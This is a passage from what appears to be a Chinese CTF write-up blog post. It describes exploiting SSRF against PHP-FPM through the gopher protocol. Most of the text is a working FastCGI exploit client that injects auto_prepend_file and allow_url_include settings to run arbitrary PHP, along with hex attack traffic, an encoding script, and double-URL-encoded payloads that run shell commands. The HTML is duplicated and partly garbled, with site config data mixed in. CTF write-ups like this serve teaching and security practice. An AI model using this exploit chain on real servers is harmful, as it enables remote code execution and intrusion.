content)</code></pre><pre><code>\n   以`py fpm.py -c [php语句] -p port host path `格式执行即可\n\n2. 首先执行`ls /`命令\n\n   ```bash\n   python ssrf_fastcgi_fpm.py -c \"&lt;?php var_dump(shell_exec('ls /'));?&gt;\" -p 9000 127.0.0.1 /usr/local/lib/php/PEAR.php</code></pre><p>   得到利用exp获得的攻击流量1.txt，用010editor打开<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719052340479.png\" alt=\"image-20210719052340479\"></p>\n<p>   以十六进制文本的形式复制下来，用以下脚本进行url编码</p>\n<pre class=\"line-numbers language-python\"><code class=\"language-python\">   a<span class=\"token operator\">=</span><span class=\"token triple-quoted-string string\">'''\n   01 01 11 C4 00 08 00 00 00 01 00 00 00 00 00 00\n   01 04 11 C4 01 E7 00 00 11 0B 47 41 54 45 57 41\n   59 5F 49 4E 54 45 52 46 41 43 45 46 61 73 74 43\n   47 49 2F 31 2E 30 0E 04 52 45 51 55 45 53 54 5F\n   4D 45 54 48 4F 44 50 4F 53 54 0F 1B 53 43 52 49\n   50 54 5F 46 49 4C 45 4E 41 4D 45 2F 75 73 72 2F\n   6C 6F 63 61 6C 2F 6C 69 62 2F 70 68 70 2F 50 45\n   41 52 2E 70 68 70 0B 1B 53 43 52 49 50 54 5F 4E\n   41 4D 45 2F 75 73 72 2F 6C 6F 63 61 6C 2F 6C 69\n   62 2F 70 68 70 2F 50 45 41 52 2E 70 68 70 0C 00\n   51 55 45 52 59 5F 53 54 52 49 4E 47 0B 1B 52 45\n   51 55 45 53 54 5F 55 52 49 2F 75 73 72 2F 6C 6F\n   63 61 6C 2F 6C 69 62 2F 70 68 70 2F 50 45 41 52\n   2E 70 68 70 0D 01 44 4F 43 55 4D 45 4E 54 5F 52\n   4F 4F 54 2F 0F 0E 53 45 52 56 45 52 5F 53 4F 46\n   54 57 41 52 45 70 68 70 2F 66 63 67 69 63 6C 69\n   65 6E 74 0B 09 52 45 4D 4F 54 45 5F 41 44 44 52\n   31 32 37 2E 30 2E 30 2E 31 0B 04 52 45 4D 4F 54\n   45 5F 50 4F 52 54 39 39 38 35 0B 09 53 45 52 56\n   45 52 5F 41 44 44 52 31 32 37 2E 30 2E 30 2E 31\n   0B 02 53 45 52 56 45 52 5F 50 4F 52 54 38 30 0B\n   09 53 45 52 56 45 52 5F 4E 41 4D 45 6C 6F 63 61\n   6C 68 6F 73 74 0F 08 53 45 52 56 45 52 5F 50 52\n   4F 54 4F 43 4F 4C 48 54 54 50 2F 31 2E 31 0C 10\n   43 4F 4E 54 45 4E 54 5F 54 59 50 45 61 70 70 6C\n   69 63 61 74 69 6F 6E 2F 74 65 78 74 0E 02 43 4F\n   4E 54 45 4E 54 5F 4C 45 4E 47 54 48 33 37 09 1F\n   50 48 50 5F 56 41 4C 55 45 61 75 74 6F 5F 70 72\n   65 70 65 6E 64 5F 66 69 6C 65 20 3D 20 70 68 70\n   3A 2F 2F 69 6E 70 75 74 0F 16 50 48 50 5F 41 44\n   4D 49 4E 5F 56 41 4C 55 45 61 6C 6C 6F 77 5F 75\n   72 6C 5F 69 6E 63 6C 75 64 65 20 3D 20 4F 6E 01\n   04 11 C4 00 00 00 00 01 05 11 C4 00 25 00 00 3C\n   3F 70 68 70 20 76 61 72 5F 64 75 6D 70 28 73 68\n   65 6C 6C 5F 65 78 65 63 28 27 6C 73 20 2F 27 29\n   29 3B 3F 3E 01 05 11 C4 00 00 00 00\n\n\n   '''</span>\n   a<span class=\"token operator\">=</span>a<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span>\n   a<span class=\"token operator\">=</span>a<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span>\n   b<span class=\"token operator\">=</span><span class=\"token string\">''</span>\n   length<span class=\"token operator\">=</span>len<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n   <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> range<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>length<span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n       b<span class=\"token operator\">+=</span><span class=\"token string\">'%'</span>\n       b<span class=\"token operator\">+=</span>a<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span>\n       b<span class=\"token operator\">+=</span>a<span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n   <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>   得到url编码后的攻击流量</p>\n<pre><codecode></pre><p>   但由于要进行两次请求，因此还要进行一次url编码，最终结果如下</p>\n<pre><code>   %2501%2501%2511%25C4%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2511%25C4%2501%25E7%2500%2500%2511%250B%2547%2541%2554%2545%2557%2541%2559%255F%2549%254E%2554%2545%2552%2546%2541%2543%2545%2546%2561%2573%2574%2543%2547%2549%252F%2531%252E%2530%250E%2504%2552%2545%2551%2555%2545%2553%2554%255F%254D%2545%2554%2548%254F%2544%2550%254F%2553%2554%250F%251B%2553%2543%2552%2549%2550%2554%255F%2546%2549%254C%2545%254E%2541%254D%2545%252F%2575%2573%2572%252F%256C%256F%2563%2561%256C%252F%256C%2569%2562%252F%2570%2568%2570%252F%2550%2545%2541%2552%252E%2570%2568%2570%250B%251B%2553%2543%2552%2549%2550%2554%255F%254E%2541%254D%2545%252F%2575%2573%2572%252F%256C%256F%2563%2561%256C%252F%256C%2569%2562%252F%2570%2568%2570%252F%2550%2545%2541%2552%252E%2570%2568%2570%250C%2500%2551%2555%2545%2552%2559%255F%2553%2554%2552%2549%254E%2547%250B%251B%2552%2545%2551%2555%2545%2553%2554%255F%2555%2552%2549%252F%2575%2573%2572%252F%256C%256F%2563%2561%256C%252F%256C%2569%2562%252F%2570%2568%2570%252F%2550%2545%2541%2552%252E%2570%2568%2570%250D%2501%2544%254F%2543%2555%254D%2545%254E%2554%255F%2552%254F%254F%2554%252F%250F%250E%2553%2545%2552%2556%2545%2552%255F%2553%254F%2546%2554%2557%2541%2552%2545%2570%2568%2570%252F%2566%2563%2567%2569%2563%256C%2569%2565%256E%2574%250B%2509%2552%2545%254D%254F%2554%2545%255F%2541%2544%2544%2552%2531%2532%2537%252E%2530%252E%2530%252E%2531%250B%2504%2552%2545%254D%254F%2554%2545%255F%2550%254F%2552%2554%2539%2539%2538%2535%250B%2509%2553%2545%2552%2556%2545%2552%255F%2541%2544%2544%2552%2531%2532%2537%252E%2530%252E%2530%252E%2531%250B%2502%2553%2545%2552%2556%2545%2552%255F%2550%254F%2552%2554%2538%2530%250B%2509%2553%2545%2552%2556%2545%2552%255F%254E%2541%254D%2545%256C%256F%2563%2561%256C%2568%256F%2573%2574%250F%2508%2553%2545%2552%2556%2545%2552%255F%2550%2552%254F%2554%254F%2543%254F%254C%2548%2554%2554%2550%252F%2531%252E%2531%250C%2510%2543%254F%254E%2554%2545%254E%2554%255F%2554%2559%2550%2545%2561%2570%2570%256C%2569%2563%2561%2574%2569%256F%256E%252F%2574%2565%2578%2574%250E%2502%2543%254F%254E%2554%2545%254E%2554%255F%254C%2545%254E%2547%2554%2548%2533%2537%2509%251F%2550%2548%2550%255F%2556%2541%254C%2555%2545%2561%2575%2574%256F%255F%2570%2572%2565%2570%2565%256E%2564%255F%2566%2569%256C%2565%2520%253D%2520%2570%2568%2570%253A%252F%252F%2569%256E%2570%2575%2574%250F%2516%2550%2548%2550%255F%2541%2544%254D%2549%254E%255F%2556%2541%254C%2555%2545%2561%256C%256C%256F%2577%255F%2575%2572%256C%255F%2569%256E%2563%256C%2575%2564%2565%2520%253D%2520%254F%256E%2501%2504%2511%25C4%2500%2500%2500%2500%2501%2505%2511%25C4%2500%2525%2500%2500%253C%253F%2570%2568%2570%2520%2576%2561%2572%255F%2564%2575%256D%2570%2528%2573%2568%2565%256C%256C%255F%2565%2578%2565%2563%2528%2527%256C%2573%2520%252F%2527%2529%2529%253B%253F%253E%2501%2505%2511%25C4%2500%2500%2500%2500</code></pre><ol start=\"3\">\n<li><p>由于PHP-FPM默认监听9000端口，所以攻击的端口也为9000</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719053932114.png\" alt=\"image-20210719053932114\"></p>\n<p>成功执行</p>\n</li>\n<li><p>接着进行同样的步骤执行<code>cat /flag_49b379d8b061225b3ed4bc32986b087f</code></p>\n<p>两次url编码后的攻击流量为</p>\n<pre><code>%2501%2501%2594%2577%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2594%2577%2501%25E7%2500%2500%2511%250B%2547%2541%2554%2545%2557%2541%2559%255F%2549%254E%2554%2545%2552%2546%2541%2543%2545%2546%2561%2573%2574%2543%2547%2549%252F%2531%252E%2530%250E%2504%2552%2545%2551%2555%2545%2553%2554%255F%254D%2545%2554%2548%254F%2544%2550%254F%2553%2554%250F%251B%2553%2543%2552%2549%2550%2554%255F%2546%2549%254C%2545%254E%2541%254D%2545%252F%2575%2573%2572%252F%256C%256F%2563%2561%256C%252F%256C%2569%2562%252F%2570%2568%2570%252F%2550%2545%2541%2552%252E%2570%2568%2570%250B%251B%2553%2543%2552%2549%2550%2554%255F%254E%2541%254D%2545%252F%2575%2573%2572%252F%256C%256F%2563%2561%256C%252F%256C%2569%2562%252F%2570%2568%2570%252F%2550%2545%2541%2552%252E%2570%2568%2570%250C%2500%2551%2555%2545%2552%2559%255F%2553%2554%2552%2549%254E%2547%250B%251B%2552%2545%2551%2555%2545%2553%2554%255F%2555%2552%2549%252F%2575%2573%2572%252F%256C%256F%2563%2561%256C%252F%256C%2569%2562%252F%2570%2568%2570%252F%2550%2545%2541%2552%252E%2570%2568%2570%250D%2501%2544%254F%2543%2555%254D%2545%254E%2554%255F%2552%254F%254F%2554%252F%250F%250E%2553%2545%2552%2556%2545%2552%255F%2553%254F%2546%2554%2557%2541%2552%2545%2570%2568%2570%252F%2566%2563%2567%2569%2563%256C%2569%2565%256E%2574%250B%2509%2552%2545%254D%254F%2554%2545%255F%2541%2544%2544%2552%2531%2532%2537%252E%2530%252E%2530%252E%2531%250B%2504%2552%2545%254D%254F%2554%2545%255F%2550%254F%2552%2554%2539%2539%2538%2535%250B%2509%2553%2545%2552%2556%2545%2552%255F%2541%2544%2544%2552%2531%2532%2537%252E%2530%252E%2530%252E%2531%250B%2502%2553%2545%2552%2556%2545%2552%255F%2550%254F%2552%2554%2538%2530%250B%2509%2553%2545%2552%2556%2545%2552%255F%254E%2541%254D%2545%256C%256F%2563%2561%256C%2568%256F%2573%2574%250F%2508%2553%2545%2552%2556%2545%2552%255F%2550%2552%254F%2554%254F%2543%254F%254C%2548%2554%2554%2550%252F%2531%252E%2531%250C%2510%2543%254F%254E%2554%2545%254E%2554%255F%2554%2559%2550%2545%2561%2570%2570%256C%2569%2563%2561%2574%2569%256F%256E%252F%2574%2565%2578%2574%250E%2502%2543%254F%254E%2554%2545%254E%2554%255F%254C%2545%254E%2547%2554%2548%2537%2535%2509%251F%2550%2548%2550%255F%2556%2541%254C%2555%2545%2561%2575%2574%256F%255F%2570%2572%2565%2570%2565%256E%2564%255F%2566%2569%256C%2565%2520%253D%2520%2570%2568%2570%253A%252F%252F%2569%256E%2570%2575%2574%250F%2516%2550%2548%2550%255F%2541%2544%254D%2549%254E%255F%2556%2541%254C%2555%2545%2561%256C%256C%256F%2577%255F%2575%2572%256C%255F%2569%256E%2563%256C%2575%2564%2565%2520%253D%2520%254F%256E%2501%2504%2594%2577%2500%2500%2500%2500%2501%2505%2594%2577%2500%254B%2500%2500%253C%253F%2570%2568%2570%2520%2576%2561%2572%255F%2564%2575%256D%2570%2528%2573%2568%2565%256C%256C%255F%2565%2578%2565%2563%2528%2527%2563%2561%2574%2520%252F%2566%256C%2561%2567%255F%2534%2539%2562%2533%2537%2539%2564%2538%2562%2530%2536%2531%2532%2532%2535%2562%2533%2565%2564%2534%2562%2563%2533%2532%2539%2538%2536%2562%2530%2538%2537%2566%2527%2529%2529%253B%253F%253E%2501%2505%2594%2577%2500%2500%2500%2500</code></pre><p>成功执行</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719055237991.png\" alt=\"image-20210719055237991\"></p>\n</li>\n<li><p>另外可以使用Gopherus这个工具，更简单一些</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719062324937.png\" alt=\"image-20210719062324937\"></p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719062711350.png\" alt=\"image-20210719062711350\"></p>\n<p>此处payload要再次进行编码才能使用</p>\n</li>\n</ol>\n<p>总结流程：</p>\n<p><strong>1.探测开放端口（这道题不用）</strong></p>\n<p><strong>2.本地构造攻击流量，通过监听端口然后url转码的形式</strong></p>\n<p><strong>3.ssrf攻击</strong></p>\n<blockquote>\n<p>参考</p>\n<p><a href=\"https://liloong3t.com/2021/02/16/2021-2-16-ssrf-shi-yong-gopher-xie-yi/\" target=\"_blank\" rel=\"noopener\">https://liloong3t.com/2021/02/16/2021-2-16-ssrf-shi-yong-gopher-xie-yi/</a></p>\n<p><a href=\"https://blog.csdn.net/mysteryflower/article/details/94386461\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/mysteryflower/article/details/94386461</a></p>\n<p><a href=\"https://blog.csdn.net/shreck66/article/details/50355729\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/shreck66/article/details/50355729</a></p>\n<p><a href=\"https://blog.csdn.net/rfrder/article/details/108589988\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/rfrder/article/details/108589988</a></p>\n</blockquote>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h1 id=\"解题步骤\"><a href=\"#解题步骤\" class=\"headerlink\" title=\"解题步骤\"></a>解题步骤</h1><ol>\n<li><p>监听9000端口，因为PHP-FPM默认监听9000端口</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719051814927.png\" alt=\"image-20210719051814927\"></p>\n<p>exp如下：</p>\n<pre><code class=\"python\">#ssrf_fastcgi_fpm.py\nimport socket\nimport random\nimport argparse\nimport sys\nfrom io import BytesIO\n\n# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client\n\nPY2 = True if sys.version_info.major == 2 else False\n\n</code></pre>\n</li>\n</ol>\n<p>   def bchr(i):<br>       if PY2:<br>           return force_bytes(chr(i))<br>       else:<br>           return bytes([i])</p>\n<p>   def bord(c):<br>       if isinstance(c, int):<br>           return c<br>       else:<br>           return ord(c)</p>\n<p>   def force_bytes(s):<br>       if isinstance(s, bytes):<br>           return s<br>       else:<br>           return s.encode(‘utf-8’, ‘strict’)</p>\n<p>   def force_text(s):<br>       if issubclass(type(s), str):<br>           return s<br>       if isinstance(s, bytes):<br>           s = str(s, ‘utf-8’, ‘strict’)<br>       else:<br>           s = str(s)<br>       return s</p>\n<p>   class FastCGIClient:<br>       “””A Fast-CGI Client for Python”””</p>\n<pre><code>   # private\n   __FCGI_VERSION = 1\n\n   __FCGI_ROLE_RESPONDER = 1\n   __FCGI_ROLE_AUTHORIZER = 2\n   __FCGI_ROLE_FILTER = 3\n\n   __FCGI_TYPE_BEGIN = 1\n   __FCGI_TYPE_ABORT = 2\n   __FCGI_TYPE_END = 3\n   __FCGI_TYPE_PARAMS = 4\n   __FCGI_TYPE_STDIN = 5\n   __FCGI_TYPE_STDOUT = 6\n   __FCGI_TYPE_STDERR = 7\n   __FCGI_TYPE_DATA = 8\n   __FCGI_TYPE_GETVALUES = 9\n   __FCGI_TYPE_GETVALUES_RESULT = 10\n   __FCGI_TYPE_UNKOWNTYPE = 11\n\n   __FCGI_HEADER_SIZE = 8\n\n   # request state\n   FCGI_STATE_SEND = 1\n   FCGI_STATE_ERROR = 2\n   FCGI_STATE_SUCCESS = 3\n\n   def __init__(self, host, port, timeout, keepalive):\n       self.host = host\n       self.port = port\n       self.timeout = timeout\n       if keepalive:\n           self.keepalive = 1\n       else:\n           self.keepalive = 0\n       self.sock = None\n       self.requests = dict()\n\n   def __connect(self):\n       self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n       self.sock.settimeout(self.timeout)\n       self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n       # if self.keepalive:\n       #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)\n       # else:\n       #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)\n       try:\n           self.sock.connect((self.host, int(self.port)))\n       except socket.error as msg:\n           self.sock.close()\n           self.sock = None\n           print(repr(msg))\n           return False\n       return True\n\n   def __encodeFastCGIRecord(self, fcgi_type, content, requestid):\n       length = len(content)\n       buf = bchr(FastCGIClient.__FCGI_VERSION) \\\n              + bchr(fcgi_type) \\\n              + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\\n              + bchr(requestid &amp; 0xFF) \\\n              + bchr((length &gt;&gt; 8) &amp; 0xFF) \\\n              + bchr(length &amp; 0xFF) \\\n              + bchr(0) \\\n              + bchr(0) \\\n              + content\n       return buf\n\n   def __encodeNameValueParams(self, name, value):\n       nLen = len(name)\n       vLen = len(value)\n       record = b&#39;&#39;\n       if nLen &lt; 128:\n           record += bchr(nLen)\n       else:\n           record += bchr((nLen &gt;&gt; 24) | 0x80) \\\n                     + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\\n                     + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\\n                     + bchr(nLen &amp; 0xFF)\n       if vLen &lt; 128:\n           record += bchr(vLen)\n       else:\n           record += bchr((vLen &gt;&gt; 24) | 0x80) \\\n                     + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\\n                     + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\\n                     + bchr(vLen &amp; 0xFF)\n       return record + name + value\n\n   def __decodeFastCGIHeader(self, stream):\n       header = dict()\n       header[&#39;version&#39;] = bord(stream[0])\n       header[&#39;type&#39;] = bord(stream[1])\n       header[&#39;requestId&#39;] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3])\n       header[&#39;contentLength&#39;] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5])\n       header[&#39;paddingLength&#39;] = bord(stream[6])\n       header[&#39;reserved&#39;] = bord(stream[7])\n       return header\n\n   def __decodeFastCGIRecord(self, buffer):\n       header = buffer.read(int(self.__FCGI_HEADER_SIZE))\n\n       if not header:\n           return False\n       else:\n           record = self.__decodeFastCGIHeader(header)\n           record[&#39;content&#39;] = b&#39;&#39;\n\n           if &#39;contentLength&#39; in record.keys():\n               contentLength = int(record[&#39;contentLength&#39;])\n               record[&#39;content&#39;] += buffer.read(contentLength)\n           if &#39;paddingLength&#39; in record.keys():\n               skiped = buffer.read(int(record[&#39;paddingLength&#39;]))\n           return record\n\n   def request(self, nameValuePairs={}, post=&#39;&#39;):\n       if not self.__connect():\n           print(&#39;connect failure! please check your fasctcgi-server !!&#39;)\n           return\n\n       requestId = random.randint(1, (1 &lt;&lt; 16) - 1)\n       self.requests[requestId] = dict()\n       request = b&quot;&quot;\n       beginFCGIRecordContent = bchr(0) \\\n                                + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\\n                                + bchr(self.keepalive) \\\n                                + bchr(0) * 5\n       request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,\n                                             beginFCGIRecordContent, requestId)\n       paramsRecord = b&#39;&#39;\n       if nameValuePairs:\n           for (name, value) in nameValuePairs.items():\n               name = force_bytes(name)\n               value = force_bytes(value)\n               paramsRecord += self.__encodeNameValueParams(name, value)\n\n       if paramsRecord:\n           request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)\n       request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#39;&#39;, requestId)\n\n       if post:\n           request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)\n       request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#39;&#39;, requestId)\n\n       self.sock.send(request)\n       self.requests[requestId][&#39;state&#39;] = FastCGIClient.FCGI_STATE_SEND\n       self.requests[requestId][&#39;response&#39;] = b&#39;&#39;\n       return self.__waitForResponse(requestId)\n\n   def __waitForResponse(self, requestId):\n       data = b&#39;&#39;\n       while True:\n           buf = self.sock.recv(512)\n           if not len(buf):\n               break\n           data += buf\n\n       data = BytesIO(data)\n       while True:\n           response = self.__decodeFastCGIRecord(data)\n           if not response:\n               break\n           if response[&#39;type&#39;] == FastCGIClient.__FCGI_TYPE_STDOUT \\\n                   or response[&#39;type&#39;] == FastCGIClient.__FCGI_TYPE_STDERR:\n               if response[&#39;type&#39;] == FastCGIClient.__FCGI_TYPE_STDERR:\n                   self.requests[&#39;state&#39;] = FastCGIClient.FCGI_STATE_ERROR\n               if requestId == int(response[&#39;requestId&#39;]):\n                   self.requests[requestId][&#39;response&#39;] += response[&#39;content&#39;]\n           if response[&#39;type&#39;] == FastCGIClient.FCGI_STATE_SUCCESS:\n               self.requests[requestId]\n       return self.requests[requestId][&#39;response&#39;]\n\n   def __repr__(self):\n       return &quot;fastcgi connect host:{} port:{}&quot;.format(self.host, self.port)</code></pre><p>   if <strong>name</strong> == ‘<strong>main</strong>‘:<br>       parser = argparse.ArgumentParser(description=’Php-fpm code execution vulnerability client.’)<br>       parser.add_argument(‘host’, help=’Target host, such as 127.0.0.1’)<br>       parser.add_argument(‘file’, help=’A php file absolute path, such as /usr/local/lib/php/System.php’)<br>       parser.add_argument(‘-c’, ‘–code’, help=’What php code your want to execute’, default=’<?php phpinfo(); exit; ?>‘)<br>       parser.add_argument(‘-p’, ‘–port’, help=’FastCGI port’, default=9000, type=int)</p>\n<pre><code>   args = parser.parse_args()\n\n   client = FastCGIClient(args.host, args.port, 3, 0)\n   params = dict()\n   documentRoot = &quot;/&quot;\n   uri = args.file\n   content = args.code\n   params = {\n       &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI/1.0&#39;,\n       &#39;REQUEST_METHOD&#39;: &#39;POST&#39;,\n       &#39;SCRIPT_FILENAME&#39;: documentRoot + uri.lstrip(&#39;/&#39;),\n       &#39;SCRIPT_NAME&#39;: uri,\n       &#39;QUERY_STRING&#39;: &#39;&#39;,\n       &#39;REQUEST_URI&#39;: uri,\n       &#39;DOCUMENT_ROOT&#39;: documentRoot,\n       &#39;SERVER_SOFTWARE&#39;: &#39;php/fcgiclient&#39;,\n       &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,\n       &#39;REMOTE_PORT&#39;: &#39;9985&#39;,\n       &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,\n       &#39;SERVER_PORT&#39;: &#39;80&#39;,\n       &#39;SERVER_NAME&#39;: &quot;localhost&quot;,\n       &#39;SERVER_PROTOCOL&#39;: &#39;HTTP/1.1&#39;,\n       &#39;CONTENT_TYPE&#39;: &#39;application/text&#39;,\n       &#39;CONTENT_LENGTH&#39;: &quot;%d&quot; % len(content),\n       &#39;PHP_VALUE&#39;: &#39;auto_prepend_file = php://input&#39;,\n       &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include = On&#39;\n   }\n   response = client.request(params, content)</code></pre><pre><code>\n   以`py fpm.py -c [php语句] -p port host path `格式执行即可\n\n2. 首先执行`ls /`命令\n\n   ```bash\n   python ssrf_fastcgi_fpm.py -c &quot;&lt;?php var_dump(shell_exec(&#39;ls /&#39;));?&gt;&quot; -p 9000 127.0.0.1 /usr/local/lib/php/PEAR.php</code></pre><p>   得到利用exp获得的攻击流量1.txt，用010editor打开<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719052340479.png\" alt=\"image-20210719052340479\"></p>\n<p>   以十六进制文本的形式复制下来，用以下脚本进行url编码</p>\n<pre><code class=\"python\">   a=&#39;&#39;&#39;\n   01 01 11 C4 00 08 00 00 00 01 00 00 00 00 00 00\n   01 04 11 C4 01 E7 00 00 11 0B 47 41 54 45 57 41\n   59 5F 49 4E 54 45 52 46 41 43 45 46 61 73 74 43\n   47 49 2F 31 2E 30 0E 04 52 45 51 55 45 53 54 5F\n   4D 45 54 48 4F 44 50 4F 53 54 0F 1B 53 43 52 49\n   50 54 5F 46 49 4C 45 4E 41 4D 45 2F 75 73 72 2F\n   6C 6F 63 61 6C 2F 6C 69 62 2F 70 68 70 2F 50 45\n   41 52 2E 70 68 70 0B 1B 53 43 52 49 50 54 5F 4E\n   41 4D 45 2F 75 73 72 2F 6C 6F 63 61 6C 2F 6C 69\n   62 2F 70 68 70 2F 50 45 41 52 2E 70 68 70 0C 00\n   51 55 45 52 59 5F 53 54 52 49 4E 47 0B 1B 52 45\n   51 55 45 53 54 5F 55 52 49 2F 75 73 72 2F 6C 6F\n   63 61 6C 2F 6C 69 62 2F 70 68 70 2F 50 45 41 52\n   2E 70 68 70 0D 01 44 4F 43 55 4D 45 4E 54 5F 52\n   4F 4F 54 2F 0F 0E 53 45 52 56 45 52 5F 53 4F 46\n   54 57 41 52 45 70 68 70 2F 66 63 67 69 63 6C 69\n   65 6E 74 0B 09 52 45 4D 4F 54 45 5F 41 44 44 52\n   31 32 37 2E 30 2E 30 2E 31 0B 04 52 45 4D 4F 54\n   45 5F 50 4F 52 54 39 39 38 35 0B 09 53 45 52 56\n   45 52 5F 41 44 44 52 31 32 37 2E 30 2E 30 2E 31\n   0B 02 53 45 52 56 45 52 5F 50 4F 52 54 38 30 0B\n   09 53 45 52 56 45 52 5F 4E 41 4D 45 6C 6F 63 61\n   6C 68 6F 73 74 0F 08 53 45 52 56 45 52 5F 50 52\n   4F 54 4F 43 4F 4C 48 54 54 50 2F 31 2E 31 0C 10\n   43 4F 4E 54 45 4E 54 5F 54 59 50 45 61 70 70 6C\n   69 63 61 74 69 6F 6E 2F 74 65 78 74 0E 02 43 4F\n   4E 54 45 4E 54 5F 4C 45 4E 47 54 48 33 37 09 1F\n   50 48 50 5F 56 41 4C 55 45 61 75 74 6F 5F 70 72\n   65 70 65 6E 64 5F 66 69 6C 65 20 3D 20 70 68 70\n   3A 2F 2F 69 6E 70 75 74 0F 16 50 48 50 5F 41 44\n   4D 49 4E 5F 56 41 4C 55 45 61 6C 6C 6F 77 5F 75\n   72 6C 5F 69 6E 63 6C 75 64 65 20 3D 20 4F 6E 01\n   04 11 C4 00 00 00 00 01 05 11 C4 00 25 00 00 3C\n   3F 70 68 70 20 76 61 72 5F 64 75 6D 70 28 73 68\n   65 6C 6C 5F 65 78 65 63 28 27 6C 73 20 2F 27 29\n   29 3B 3F 3E 01 05 11 C4 00 00 00 00\n\n\n   &#39;&#39;&#39;\n   a=a.replace(&#39;\\n&#39;,&#39;&#39;)\n   a=a.replace(&#39; &#39;,&#39;&#39;)\n   b=&#39;&#39;\n   length=len(a)\n   for i in range(0,length,2):\n       b+=&#39;%&#39;\n       b+=a[i]\n       b+=a[i+1]\n   print(b)\n</code></pre>\n<p>   得到url编码后的攻击流量</p>\n<pre><codecode></pre><p>   但由于要进行两次请求，因此还要进行一次url编码，最终结果如下</p>\n<pre><codecode></pre><ol start=\"3\">\n<li><p>由于PHP-FPM默认监听9000端口，所以攻击的端口也为9000</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719053932114.png\" alt=\"image-20210719053932114\"></p>\n<p>成功执行</p>\n</li>\n<li><p>接着进行同样的步骤执行<code>cat /flag_49b379d8b061225b3ed4bc32986b087f</code></p>\n<p>两次url编码后的攻击流量为</p>\n<pre><codecode></pre><p>成功执行</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719055237991.png\" alt=\"image-20210719055237991\"></p>\n</li>\n<li><p>另外可以使用Gopherus这个工具，更简单一些</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719062324937.png\" alt=\"image-20210719062324937\"></p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719062711350.png\" 